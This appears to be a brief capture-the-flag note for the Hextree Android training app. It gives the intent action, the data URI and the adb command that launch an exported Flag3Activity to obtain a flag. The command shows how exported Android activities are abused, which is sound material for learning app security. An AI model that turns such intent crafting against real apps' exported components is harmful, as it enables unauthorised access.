# Exported activity with explicit-intent 

## exploit requirements to reach success method 

1. action -> io.hextree.action.GIVE_FLAG
2. data URI -> **https://app.hextree.io/map/android**

adb shell -> am start-activity -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d https://app.hextree.io/map/android